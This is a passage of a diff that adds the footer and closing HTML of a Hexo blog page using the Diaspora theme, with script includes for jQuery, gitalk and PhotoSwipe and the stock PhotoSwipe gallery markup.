+            <a href="/atom.xml">RSS</a>
+        </div>
+
+        <p class="f-footer-meta">
+            &copy; 2026 Allureluoli · Powered by Hexo · Theme Diaspora · 魔改 by 二月
+        </p>
+
+        
+        <p class="f-footer-beian">
+            <a rel="nofollow" href="https://www.baidu.com/s?wd=为什么有的网站没有备案" target="_blank">为什么呢</a>
+        </p>
+        
+    </div>
+</footer>
+
+
+    <button class="f-totop" id="f-totop" type="button" aria-label="回到顶部">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 19V5M5 12l7-7 7 7" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </button>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<script src="/js/february.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
